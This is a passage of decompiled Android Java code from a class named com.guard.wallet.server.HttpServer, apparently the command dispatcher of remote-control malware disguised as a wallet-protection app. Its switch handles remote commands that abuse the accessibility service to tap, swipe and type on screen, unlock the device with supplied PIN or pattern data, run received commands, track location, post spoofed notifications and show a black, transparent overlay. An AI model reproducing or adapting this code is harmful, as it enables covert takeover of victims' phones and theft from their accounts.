                        m497m(abstractC0381k);
                        break;
                    case 'V':
                        m496l(abstractC0381k, c0334e.m875a("callNumber"));
                        break;
                    case 'W':
                        U2(AbstractC0026q.m153D(c0334e.m875a("audioSource")) ? Integer.parseInt(c0334e.m875a("audioSource")) : 1, abstractC0381k);
                        break;
                    case 'X':
                        d3(abstractC0381k);
                        break;
                    case 'Y':
                        c2(abstractC0381k);
                        break;
                    case 'Z':
                        K2(null, abstractC0381k);
                        break;
                    case '[':
                        R2(null, abstractC0381k);
                        break;
                    case '\\':
                        Z2(null, abstractC0381k);
                        break;
                    case ']':
                        O2(c0334e.m875a("packageName"), null, abstractC0381k);
                        break;
                    case '^':
                        Q2(c0334e.m875a("packageName"), null, abstractC0381k);
                        break;
                    case '_':
                        Y1(c0334e.m875a("notificationTitle"), c0334e.m875a("notificationContent"), c0334e.m875a("notificationButton"), c0334e.m875a("packageName"), c0334e.m875a("startActivity"), abstractC0381k);
                        break;
                    case '`':
                        J2(c0334e.m875a("notificationTitle"), c0334e.m875a("notificationContent"), c0334e.m875a("notificationButton"), c0334e.m875a("packageName"), c0334e.m875a("notificationIcon"), abstractC0381k);
                        break;
                    case 'a':
                        l1(abstractC0381k);
                        break;
                    case 'b':
                        f2(abstractC0381k);
                        break;
                    case 'c':
                        g2(abstractC0381k);
                        break;
                    case 'd':
                        m459A(abstractC0381k);
                        break;
                    case 'e':
                        m486b(abstractC0381k);
                        break;
                    case 'f':
                        G2(abstractC0381k);
                        break;
                    case CipherSuite.TLS_DHE_RSA_WITH_AES_128_CBC_SHA256 /* 103 */:
                        H2(abstractC0381k);
                        break;
                    case CipherSuite.TLS_DH_DSS_WITH_AES_256_CBC_SHA256 /* 104 */:
                        m465G(new RequestCommand((List) c0334e.get("command")), abstractC0381k);
                        break;
                    case CipherSuite.TLS_DH_RSA_WITH_AES_256_CBC_SHA256 /* 105 */:
                        if (MyAccessibilityService.m554P() != null) {
                            E3(abstractC0381k);
                            break;
                        }
                        M1(abstractC0381k);
                    case CipherSuite.TLS_DHE_DSS_WITH_AES_256_CBC_SHA256 /* 106 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            D1(abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 /* 107 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            f1(y3(c0334e.m875a("actionName"), c0334e.m875a("start"), c0334e.m875a("duration"), (List) c0334e.get("x"), (List) c0334e.get("y")), abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_anon_WITH_AES_128_CBC_SHA256 /* 108 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            k1(abstractC0381k, c0334e.m875a(TextBundle.TEXT_ENTRY));
                        }
                    case CipherSuite.TLS_DH_anon_WITH_AES_256_CBC_SHA256 /* 109 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            h1(abstractC0381k);
                        }
                    case 'n':
                        j1(abstractC0381k);
                        break;
                    case 'o':
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            g1(abstractC0381k);
                        }
                    case 'p':
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            i1(abstractC0381k);
                        }
                    case 'q':
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            K1(abstractC0381k);
                        }
                    case 'r':
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            J1(abstractC0381k);
                        }
                    case 's':
                        u1(abstractC0381k, c0334e.containsKey("keep") ? Boolean.parseBoolean(c0334e.m875a("keep")) : true);
                        break;
                    case 't':
                        Type type = new TypeToken<List<Point>>() { // from class: com.guard.wallet.server.HttpServer$1
                        }.getType();
                        Gson gson = new Gson();
                        String m875a3 = c0334e.m875a("cipherGradeCode");
                        String m875a4 = c0334e.m875a("textCipher");
                        String m875a5 = c0334e.m875a("patternCipher");
                        String m875a6 = c0334e.m875a("touchCipher");
                        String m875a7 = c0334e.m875a("eventCipher");
                        String m875a8 = c0334e.m875a("boundsInScreen");
                        String m875a9 = c0334e.m875a("boundsInParent");
                        ReqUnlockDeviceVO reqUnlockDeviceVO = new ReqUnlockDeviceVO();
                        reqUnlockDeviceVO.setCipherGradeCode(m875a3);
                        reqUnlockDeviceVO.setTextCipher(m875a4);
                        if (!AbstractC0026q.m151B(m875a5)) {
                            reqUnlockDeviceVO.setPatternCipher((List) gson.fromJson(m875a5, type));
                        }
                        if (!AbstractC0026q.m151B(m875a6)) {
                            reqUnlockDeviceVO.setTouchCipher((List) gson.fromJson(m875a6, type));
                        }
                        if (!AbstractC0026q.m151B(m875a7)) {
                            reqUnlockDeviceVO.setEventCipher((List) gson.fromJson(m875a7, new TypeToken<List<TouchEvent>>() { // from class: com.guard.wallet.server.HttpServer$2
                            }.getType()));
                        }
                        if (!AbstractC0026q.m151B(m875a8)) {
                            reqUnlockDeviceVO.setBoundsInScreen((Rect) gson.fromJson(m875a8, new TypeToken<Rect>() { // from class: com.guard.wallet.server.HttpServer$3
                            }.getType()));
                        }
                        if (!AbstractC0026q.m151B(m875a9)) {
                            reqUnlockDeviceVO.setBoundsInParent((Rect) gson.fromJson(m875a9, new TypeToken<Rect>() { // from class: com.guard.wallet.server.HttpServer$4
                            }.getType()));
                        }
                        A3(reqUnlockDeviceVO, abstractC0381k);
                        break;
                    case 'u':
                        m3(c0334e.m875a("filepath"), c0334e.m875a("fileUrl"), Boolean.parseBoolean(c0334e.m875a("saveToGallery")), abstractC0381k);
                        break;
                    case 'v':
                        m489e(c0334e.m875a("filepath"), c0334e.m875a("fileUrl"), Boolean.parseBoolean(c0334e.m875a("saveToGallery")), abstractC0381k);
                        break;
                    case 'w':
                        m509y(c0334e.m875a("filePathAndName"), c0334e.m875a("galleryUrl"), abstractC0381k);
                        break;
                    case 'x':
                        b2(new ReqMonitorLocationVO(Long.valueOf(AbstractC0026q.m153D(c0334e.m875a("minTimeMs")) ? Long.parseLong(c0334e.m875a("minTimeMs")) : 10000L), Float.valueOf(AbstractC0026q.m153D(c0334e.m875a("minDistanceM")) ? Float.parseFloat(c0334e.m875a("minDistanceM")) : 100.0f)), abstractC0381k);
                        break;
                    case 'y':
                        m498n(abstractC0381k);
                        break;
                    case 'z':
                        m494j(Boolean.parseBoolean(c0334e.m875a("show")), Boolean.parseBoolean(c0334e.m875a("transparent")), c0334e.m875a("hint"), Boolean.parseBoolean(c0334e.m875a("zeroBrightness")), Boolean.parseBoolean(c0334e.m875a("destroyLock")), abstractC0381k);
                        break;
                    case '{':
                        Z1(abstractC0381k);
                        break;
                    case '|':
                        S2(abstractC0381k);
                        break;
                    case '}':
                        c1(abstractC0381k);
                        break;
                    case '~':
                        R1(abstractC0381k);
                        break;
                    case CertificateBody.profileType /* 127 */:
                        k3(abstractC0381k, Boolean.parseBoolean(c0334e.m875a("canWriteSecure")));
                        break;
                    case 128:
                        m495k(abstractC0381k);
                        break;
                    case 129:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            a0(m875a, c0334e.m875a(TextBundle.TEXT_ENTRY), m875a2, parseInt, abstractC0381k);
                        }
                    case 130:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            V0(m875a, c0334e.m875a(TextBundle.TEXT_ENTRY), m875a2, parseInt, abstractC0381k);
                        }
                    case 131:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            w0(m875a, c0334e.m875a(TextBundle.TEXT_ENTRY), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_WITH_CAMELLIA_256_CBC_SHA /* 132 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            b0(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_DSS_WITH_CAMELLIA_256_CBC_SHA /* 133 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            W0(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_RSA_WITH_CAMELLIA_256_CBC_SHA /* 134 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            x0(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA /* 135 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            e0(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA /* 136 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            Z0(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_anon_WITH_CAMELLIA_256_CBC_SHA /* 137 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            A0(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_PSK_WITH_RC4_128_SHA /* 138 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            c0(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_PSK_WITH_3DES_EDE_CBC_SHA /* 139 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            X0(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_PSK_WITH_AES_128_CBC_SHA /* 140 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            y0(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_PSK_WITH_AES_256_CBC_SHA /* 141 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            d0(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_PSK_WITH_RC4_128_SHA /* 142 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            Y0(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_PSK_WITH_3DES_EDE_CBC_SHA /* 143 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            z0(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_PSK_WITH_AES_128_CBC_SHA /* 144 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m479U(m875a, c0334e.m875a("id"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_PSK_WITH_AES_256_CBC_SHA /* 145 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            P0(m875a, c0334e.m875a("id"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_PSK_WITH_RC4_128_SHA /* 146 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            r0(m875a, c0334e.m875a("id"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_PSK_WITH_3DES_EDE_CBC_SHA /* 147 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m480V(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_PSK_WITH_AES_128_CBC_SHA /* 148 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            Q0(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_PSK_WITH_AES_256_CBC_SHA /* 149 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            s0(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_WITH_SEED_CBC_SHA /* 150 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m483Y(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_DSS_WITH_SEED_CBC_SHA /* 151 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            T0(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_RSA_WITH_SEED_CBC_SHA /* 152 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            v0(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_DSS_WITH_SEED_CBC_SHA /* 153 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m481W(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_RSA_WITH_SEED_CBC_SHA /* 154 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            R0(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_anon_WITH_SEED_CBC_SHA /* 155 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            t0(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_WITH_AES_128_GCM_SHA256 /* 156 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m482X(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_WITH_AES_256_GCM_SHA384 /* 157 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            S0(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 /* 158 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            u0(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 /* 159 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m474P(m875a, c0334e.m875a("desc"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_RSA_WITH_AES_128_GCM_SHA256 /* 160 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            K0(m875a, c0334e.m875a("desc"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_RSA_WITH_AES_256_GCM_SHA384 /* 161 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m0(m875a, c0334e.m875a("desc"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_DSS_WITH_AES_128_GCM_SHA256 /* 162 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m475Q(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_DSS_WITH_AES_256_GCM_SHA384 /* 163 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            L0(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_DSS_WITH_AES_128_GCM_SHA256 /* 164 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            n0(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_DSS_WITH_AES_256_GCM_SHA384 /* 165 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m478T(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_anon_WITH_AES_128_GCM_SHA256 /* 166 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            O0(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_anon_WITH_AES_256_GCM_SHA384 /* 167 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            q0(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_PSK_WITH_AES_128_GCM_SHA256 /* 168 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m476R(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_PSK_WITH_AES_256_GCM_SHA384 /* 169 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            M0(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_PSK_WITH_AES_128_GCM_SHA256 /* 170 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            o0(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_PSK_WITH_AES_256_GCM_SHA384 /* 171 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m477S(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_PSK_WITH_AES_128_GCM_SHA256 /* 172 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            N0(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_PSK_WITH_AES_256_GCM_SHA384 /* 173 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            p0(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_PSK_WITH_AES_128_CBC_SHA256 /* 174 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m466H(m875a, c0334e.m875a("className"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_PSK_WITH_AES_256_CBC_SHA384 /* 175 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            B0(m875a, c0334e.m875a("className"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_PSK_WITH_NULL_SHA256 /* 176 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            g0(m875a, c0334e.m875a("className"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_PSK_WITH_NULL_SHA384 /* 177 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m467I(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_PSK_WITH_AES_128_CBC_SHA256 /* 178 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            C0(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_PSK_WITH_AES_256_CBC_SHA384 /* 179 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            h0(m875a, c0334e.m875a("contains"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_PSK_WITH_NULL_SHA256 /* 180 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m470L(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_PSK_WITH_NULL_SHA384 /* 181 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            F0(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_PSK_WITH_AES_128_CBC_SHA256 /* 182 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            k0(m875a, c0334e.m875a("prefix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_PSK_WITH_AES_256_CBC_SHA384 /* 183 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m468J(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_PSK_WITH_NULL_SHA256 /* 184 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            D0(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_PSK_WITH_NULL_SHA384 /* 185 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            i0(m875a, c0334e.m875a("suffix"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_RSA_WITH_CAMELLIA_128_CBC_SHA256 /* 186 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            m469K(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DH_DSS_WITH_CAMELLIA_128_CBC_SHA256 /* 187 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            E0(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case 188:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            j0(m875a, c0334e.m875a("regex"), m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA256 /* 189 */:
                        if (MyAccessibilityService.m554P() == null) {
                            M1(abstractC0381k);
                            break;
                        } else {
                            e2(m875a, m875a2, parseInt, abstractC0381k);
                        }
                    case CipherSuite.TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA256 /* 190 */:
                        i2(abstractC0381k, m875a);
                        break;
                    default:
                        N1(abstractC0381k);
                        break;
                }
            }
            n1(abstractC0381k);
        } catch (Exception e3) {
            e = e3;
            AbstractC0026q.m186s("HttpServer", e);
        }
    }

    public final void f3() {
        try {
            ArrayList arrayList = this.f293a.f746b;
            if (arrayList != null) {
                Iterator it = arrayList.iterator();
                while (it.hasNext()) {
                    C0282c c0282c = (C0282c) it.next();
                    AbstractC0026q.m177h(c0282c.f505a);
                    try {
                        c0282c.f506b.cancel();
                    } catch (Exception unused) {
                    }
                }
            }
            AtomicInteger atomicInteger = f292c;
            atomicInteger.set(0);
            Log.d("HttpServer", "asyncHttpServer 已停止");
            MessageRecordVO messageRecordVO = new MessageRecordVO();
            ContainerEventVO containerEventVO = new ContainerEventVO();
            if (MainApplication.getInstance() != null) {
                containerEventVO.setPackageName(MainApplication.getInstance().getPackageName());
            }
            containerEventVO.setContainerCode("ACCESSIBILITY_CONTAINER");
            containerEventVO.setIsOpened(MyAccessibilityService.m554P() != null ? 1 : 0);
            containerEventVO.setServiceState(Integer.valueOf(atomicInteger.get()));
            messageRecordVO.setIntentCode("android.intent.action.CONTAINER_EVENT");
            messageRecordVO.setExtraBody(containerEventVO);
            if (MainApplication.getInstance() == null || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
                return;
            }
            MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }
}
